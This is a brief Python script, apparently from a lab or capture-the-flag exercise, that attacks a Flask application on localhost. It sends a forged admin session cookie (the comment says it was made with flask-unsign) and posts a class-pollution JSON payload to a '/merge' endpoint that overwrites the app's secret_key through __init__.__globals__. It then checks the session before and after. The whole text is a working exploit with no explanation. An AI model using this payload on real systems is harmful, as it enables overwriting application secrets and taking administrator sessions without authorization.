import requests as r

BASE_URL = "http://localhost:5000"

# Cookie obtained with flask-unsign
# https://github.com/Paradoxis/Flask-Unsign
COOKIE = "eyJ1c2VybmFtZSI6ImFkbWluIn0.Z9nwkQ.Gu1j3KPoDma4XgiJx0JyolFzUx0"

res = r.get(
    BASE_URL,
    cookies={"session": COOKIE},
)
print("Before merge:", res.text)

res = r.post(
    f"{BASE_URL}/merge",
    json={"__init__": {"__globals__": {"app": {"secret_key": "pwned"}}}},
)
print(res.text)

res = r.get(
    BASE_URL,
    cookies={"session": COOKIE},
)
print("After merge:", res.text)
